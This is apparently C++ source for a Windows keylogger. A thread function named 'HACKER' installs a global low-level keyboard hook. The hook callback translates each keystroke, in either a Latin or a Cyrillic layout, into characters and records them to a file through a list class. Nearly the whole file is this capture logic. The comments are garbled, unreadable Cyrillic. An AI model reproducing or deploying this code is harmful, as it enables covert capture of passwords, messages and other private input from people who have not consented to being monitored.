#include "stdafx.h"
#include "Data_list.h"
#include <list>
#include "Claf.h"
#include <iostream>
#include "tree_container.cpp"
#include <iostream>
#include <Windows.h>

using namespace std;


HHOOK hKeyboardHook;//���
int n = 0;

bool isCapsLock();
bool ShiftCAPS(bool p, bool q);
void add_Claff(char *, int, Data_list &);

//��������� ���������� �� ����� � ������
BinarySearchTree<Claf> link(Data_list&obj){
	int num, i;
	BinarySearchTree<Claf> p;//������� ������
	Claf G;
	for (i = 0; i < obj.size_of(); i++){
		G = obj.top_front(i);//��������������� �������� �������� �� �������
		p.insert(G);//��������� �� � ������
	}
	return p;
	//p.print_inorder();
}

void add_Claff(char *z, int M, Data_list &List1){
	Claf T;//������� ������
	int ch;
	T.set_Claf(z, M);//�������������� ���
	List1.add_list(T);
	ch = List1.size_of();//���������� � ����
	if (ch == 1)
		List1.write_file();
}


LRESULT WINAPI Keyboard(int nCode, WPARAM wParam, LPARAM lParam)//������� ����
{
	
	Data_list List1;
	//���� ������� ������
	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
	{
		//��������� ��������� ��� ����
		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
		//��������� �������� ������� ������� (����������� ��������)
		int key = hooked_key.vkCode;		

		if (GetAsyncKeyState(VK_LSHIFT)){//�������� �� ������������ �����
			if (GetAsyncKeyState(VK_MENU)){
				n++;				
				Sleep(200);
			}
		}
		//if (GetAsyncKeyState(51) ){
		//	if (GetAsyncKeyState(52)){				
		//		Sleep(200);
		//		PostQuitMessage(0);
		//return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
		//	}
		//}
		switch (key){//����� ������� �� ����������� ��������
		case 8:
			add_Claff("[BCK]", 8, List1);
			break;
		case VK_SPACE:
			add_Claff(" ", 32, List1);		
			break;
		case VK_TAB:
			add_Claff("[TAB]", 9, List1);		
			break;
		case VK_ESCAPE:
			add_Claff("[Esc]", 27, List1);
			PostQuitMessage(0);			
			break;
		case VK_END:
			//fprintf(OUTPUT_FILE, "%s", "[END]");
			break;
		case VK_HOME:
			//fprintf(OUTPUT_FILE, "%s", "[HOME]");
			break;
		case VK_UP:
		//	fprintf(OUTPUT_FILE, "%s", "[UP]");
			break;
		case VK_DOWN:
		//	fprintf(OUTPUT_FILE, "%s", "[DOWN]");
			break;
		case VK_LEFT:
		//	fprintf(OUTPUT_FILE, "%s", "[LEFT]");
			break;
		case VK_RIGHT:
		//	fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
			break;
		case 190:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 158, List1);	//������ ������� � �������� ����				
				}
				else{
					add_Claff("�", 238, List1);				
				}
			}
			if (n % 2 == 0){
				if (GetAsyncKeyState(VK_SHIFT)){
					add_Claff(">", 62, List1);					
				}
				else{
					add_Claff(".", 46, List1);					
				}
			}
			break;
		case VK_CONTROL:
			add_Claff("[CTRL]", 17, List1);			
			break;
		case VK_MENU:
			add_Claff("[ALT]", 18, List1);			
			break;
		case VK_CAPITAL:
			add_Claff("[CAPS]", 20, List1);			
			break;
		case VK_INSERT:
			add_Claff("[INSERT]", 1, List1);			
			break;
		case VK_DELETE:
			add_Claff("[DEL]", 127, List1);			
			break;
		case VK_OEM_2:
			if (n % 2 == 1){
				if (GetAsyncKeyState(VK_SHIFT)){
					add_Claff(",", 44, List1);					
				}
				else{
					add_Claff(".", 46, List1);					
				}
			}
			if (n % 2 == 0){
				if (GetAsyncKeyState(VK_SHIFT)){
					add_Claff("?", 63, List1);					
				}
				else{
					add_Claff("/", 47, List1);					
				}
			}
			break;
		case VK_OEM_3:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 168, List1);					
				}
				else{
					add_Claff("�", 184, List1);				
				}
			}
			if (n % 2 == 0){
				if (GetAsyncKeyState(VK_SHIFT)){
					add_Claff("~", 126, List1);					
				}
				else{
					add_Claff("`", 96, List1);				
				}
			}
			break;
		case VK_OEM_4:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){					
					add_Claff("X", 213, List1);
				}
				else{
					add_Claff("�", 245, List1);				
				}
			}
			if (n % 2 == 0){
				if (GetAsyncKeyState(VK_SHIFT)){
					add_Claff("{", 123, List1);				
				}
				else{
					add_Claff("[", 91, List1);				
				}
			}
			break;
		case VK_OEM_5:
			if (n % 2 == 1){
				if (GetAsyncKeyState(VK_SHIFT)){
					add_Claff("/", 47, List1);				
				}
				else{
					add_Claff("\\", 92, List1);				
				}
			}
			if (n % 2 == 0){
				if (GetAsyncKeyState(VK_SHIFT)){
					add_Claff("|", 124, List1);					
				}
				else{
					add_Claff("\\", 92, List1);					
				}
			}
			break;
		case VK_OEM_6:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 218, List1);					
				}
				else{
					add_Claff("�", 250, List1);				
				}
			}
			if (n % 2 == 0){
				if (GetAsyncKeyState(VK_SHIFT)){
					add_Claff("}", 125, List1);					
				}
				else{
					add_Claff("]", 93, List1);					
				}
			}
			break;
		case VK_OEM_7:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 221, List1);					
				}
				else{
					add_Claff("�", 253, List1);					
				}
			}
			if (n % 2 == 0){
				if (GetAsyncKeyState(VK_SHIFT)){
					add_Claff("\"", 34, List1);				
				}
				else{
					add_Claff("'", 39, List1);					
				}
			}
			break;
		case VK_SHIFT:
			break;
		case 188:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 193, List1);					
				}
				else{
					add_Claff("�", 225, List1);					
				}
			}
			if (n % 2 == 0){
				if (GetAsyncKeyState(VK_SHIFT)){
					add_Claff("<", 60, List1);					
				}
				else{
					add_Claff(",", 44, List1);					
				}
			}
			break;
		case 186:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 198, List1);					
				}
				else{
					add_Claff("�", 230, List1);					
				}
			}
			if (n % 2 == 0){
				if (GetAsyncKeyState(VK_SHIFT)){
					add_Claff(":", 58, List1);				
				}
				else{
					add_Claff(";", 59, List1);					
				}
			}
			break;
		case 189:
			if (GetAsyncKeyState(VK_SHIFT)){
				add_Claff("_", 95, List1);				
			}
			else{
				add_Claff("-", 45, List1);			
			}
			break;
		case 187:
			if (GetAsyncKeyState(VK_SHIFT)){
				add_Claff("+", 43, List1);				
			}
			else{
				add_Claff("=", 61, List1);				
			}
			break;
		case 48:
			if (GetAsyncKeyState(VK_SHIFT)){
				add_Claff(")", 41, List1);				
			}
			else{
				add_Claff("0", 48, List1);				
			}
			break;
		case 49:
			if (GetAsyncKeyState(VK_SHIFT)){
				add_Claff("!", 33, List1);				
			}
			else{
				add_Claff("1", 49, List1);				
			}
			break;
		case 50:
			if (GetAsyncKeyState(VK_SHIFT)){
				if (n % 2 == 1){
					add_Claff("\"", 34, List1);					
				}
				if (n % 2 == 0){
					add_Claff("@", 64, List1);				
				}
			}
			else{
				add_Claff("2", 50, List1);				
			}
			break;
		case 51:
			if (GetAsyncKeyState(VK_SHIFT)){
				if (n % 2 == 1){
					add_Claff("�", 185, List1);				
				}
				if (n % 2 == 0){
					add_Claff("#", 35, List1);				
				}
			}
			else{
				add_Claff("3", 51, List1);			
			}
			break;
		case 52:
			if (GetAsyncKeyState(VK_SHIFT)){
				if (n % 2 == 1){
					add_Claff(";", 59, List1);					
				}
				if (n % 2 == 0){
					add_Claff("$", 36, List1);				
				}
			}
			else{
				add_Claff("4", 52, List1);				
			}
			break;
		case 53:
			if (GetAsyncKeyState(VK_SHIFT)){
				add_Claff("%", 37, List1);				
			}
			else{
				add_Claff("5", 53, List1);				
			}
			break;
		case 54:
			if (GetAsyncKeyState(VK_SHIFT)){
				if (n % 2 == 1){
					add_Claff(":", 58, List1);					
				}
				if (n % 2 == 0){
					add_Claff("^", 94, List1);				
				}
			}
			else{
				add_Claff("6", 54, List1);				
			}
			break;
		case 55:
			if (GetAsyncKeyState(VK_SHIFT)){
				if (n % 2 == 1){
					add_Claff("?", 63, List1);					
				}
				if (n % 2 == 0){
					add_Claff("&", 38, List1);					
				}
			}
			else{
				add_Claff("7", 55, List1);				
			}
			break;
		case 56:
			if (GetAsyncKeyState(VK_SHIFT)){
				add_Claff("*", 42, List1);				
			}
			else{
				add_Claff("8", 56, List1);			
			}
			break;
		case 57:
			if (GetAsyncKeyState(VK_SHIFT)){
				add_Claff("(", 40, List1);				
			}
			else{
				add_Claff("9", 57, List1);			
			}
			break;
		case 0x41:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 212, List1);					
				}
				else{
					add_Claff("�", 244, List1);				
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("A", 65, List1);				
				}
				else{
					add_Claff("a", 97, List1);					
				}
			}
			break;
		case 0x42:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 200, List1);					
				}
				else{
					add_Claff("�", 232, List1);				
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("B", 66, List1);				
				}
				else{
					add_Claff("b", 98, List1);				
				}
			}
			break;
		case 0x43:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 209, List1);					
				}
				else{
					add_Claff("�", 241, List1);				
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("C", 67, List1);					
				}
				else{
					add_Claff("c", 99, List1);					
				}
			}
			break;
		case 0x44:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 194, List1);					
				}

				else{
					add_Claff("�", 226, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("D", 68, List1);					
				}
				else{
					add_Claff("d", 100, List1);					
				}
			}
			break;
		case 0x45:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 211, List1);					
				}
				else{
					add_Claff("�", 243, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("E", 69, List1);					
				}
				else{
					add_Claff("e", 101, List1);					
				}
			}
			break;
		case 0x46:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 192, List1);					
				}
				else{
					add_Claff("�", 224, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("F", 70, List1);					
				}
				else{
					add_Claff("f", 102, List1);					
				}
			}
			break;
		case 0x47:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 207, List1);					
				}
				else{
					add_Claff("�", 239, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("G", 71, List1);					
				}
				else{
					add_Claff("g", 103, List1);					
				}
			}
			break;
		case 0x48:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 208, List1);					
				}
				else{
					add_Claff("�", 240, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("H", 72, List1);					
				}
				else{
					add_Claff("h", 104, List1);					
				}
			}
			break;
		case 0x49:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 216, List1);					
				}
				else{
					add_Claff("�", 248, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("I", 73, List1);					
				}

				else{
					add_Claff("i", 105, List1);				
				}
			}
			break;
		case 0x4A:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 206, List1);					
				}
				else{
					add_Claff("�", 238, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("J", 74, List1);					
				}
				else{
					add_Claff("j", 106, List1);					
				}
			}
			break;
		case 0x4B:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 203, List1);					
				}
				else{
					add_Claff("�", 235, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("K", 75, List1);					
				}
				else{
					add_Claff("k", 107, List1);					
				}
			}
			break;
		case 0x4C:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 196, List1);					
				}
				else{
					add_Claff("�", 228, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("L", 76, List1);					
				}
				else{
					add_Claff("l", 108, List1);					
				}
			}
			break;
		case 0x4D:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 220, List1);					
				}
				else{
					add_Claff("�", 252, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("M", 77, List1);					
				}
				else{
					add_Claff("m", 109, List1);					
				}
			}
			break;
		case 0x4E:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 210, List1);					
				}
				else{
					add_Claff("�", 242, List1);				
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("N", 78, List1);					
				}
				else{
					add_Claff("n", 110, List1);
				}
			}
			break;
		case 0x4F:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 217, List1);					
				}
				else{
					add_Claff("�", 249, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("O", 79, List1);					
				}
				else{
					add_Claff("o", 111, List1);					
				}
			}
			break;
		case 0x50:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 199, List1);					
				}
				else{
					add_Claff("�", 231, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("P", 80, List1);					
				}
				else{
					add_Claff("p", 112, List1);					
				}
			}
			break;
		case 0x51:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 201, List1);					
				}
				else{
					add_Claff("�", 233, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("Q", 81, List1);					
				}
				else{
					add_Claff("q", 113, List1);					
				}
			}
			break;
		case 0x52:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 202, List1);					
				}
				else{
					add_Claff("�", 234, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("R", 82, List1);					
				}
				else{
					add_Claff("r", 114, List1);					
				}
			}
			break;
		case 0x53:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 219, List1);					
				}
				else{
					add_Claff("�", 251, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("S", 83, List1);					
				}
				else{
					add_Claff("s", 115, List1);					
				}
			}
			break;
		case 0x54:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 197, List1);					
				}
				else{
					add_Claff("�", 229, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("T", 84, List1);					
				}
				else{
					add_Claff("t", 116, List1);					
				}
			}
			break;
		case 0x55:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 195, List1);					
				}
				else{
					add_Claff("�", 227, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("U", 85, List1);					
				}
				else{
					add_Claff("u", 117, List1);					
				}
			}
			break;
		case 0x56:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 204, List1);					
				}
				else{
					add_Claff("�", 236, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("V", 86, List1);					
				}
				else{
					add_Claff("v", 118, List1);					
				}
			}
			break;
		case 0x57:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 214, List1);					
				}
				else{
					add_Claff("�", 246, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("W", 87, List1);					
				}
				else{
					add_Claff("w", 119, List1);					
				}
			}
			break;
		case 0x58:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 215, List1);					
				}
				else{
					add_Claff("�", 247, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("X", 88, List1);					
				}
				else{
					add_Claff("x", 120, List1);					
				}
			}
			break;
		case 0x59:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 205, List1);					
				}
				else{
					add_Claff("�", 237, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("Y", 89, List1);					
				}
				else{
					add_Claff("y", 121, List1);					
				}
			}
			break;
		case 0x5A:
			if (n % 2 == 1){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("�", 223, List1);						
				}
				else{
					add_Claff("�", 255, List1);					
				}
			}
			if (n % 2 == 0){
				if (ShiftCAPS(GetAsyncKeyState(VK_SHIFT), isCapsLock())){
					add_Claff("Z", 90, List1);						
				}
				else{
					add_Claff("z", 122, List1);					
				}
			}
			break;
		}
		if (GetAsyncKeyState(13)){
			add_Claff("[Enter]", 13, List1);			
		}
	}
	//����� ���� ������� ��� ����
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

DWORD WINAPI HACKER(LPVOID lpParm)
{
	bool b;
	int l = 1;
	HINSTANCE hins;
	hins = GetModuleHandle(NULL);//��������� �� (.exe) ����(�.�. �������� NULL)
	//��������� ���� �� 
	//1)���������� 
	//2)���-��� ������� Keyboard
	//3)����� (.exe) ���� 
	//4)������������ �� ���� �������	
	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Keyboard, hins, 0);
	MSG message;
	while (1){
		if ((b = GetMessage(&message, NULL, 0, 0)) != 0 && l == 1)
		{
			//������� �� ����������� ������� � ���������� ��������
			TranslateMessage(&message);
			//������������ ��������� ������� ���������	
			DispatchMessage(&message);
		}
		else{
			break;//������� ����� b==-1
		}

	}
	fflush(stdin);
	//������ ����
	UnhookWindowsHookEx(hKeyboardHook);
	return 0;
}

//�������� �� �������������� ������� CAPSLOCK � SHIFT
bool ShiftCAPS(bool p, bool q)
{
	return ((p || q) && !(p && q));
}

bool isCapsLock()
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
		return true;
	else
		return false;
}


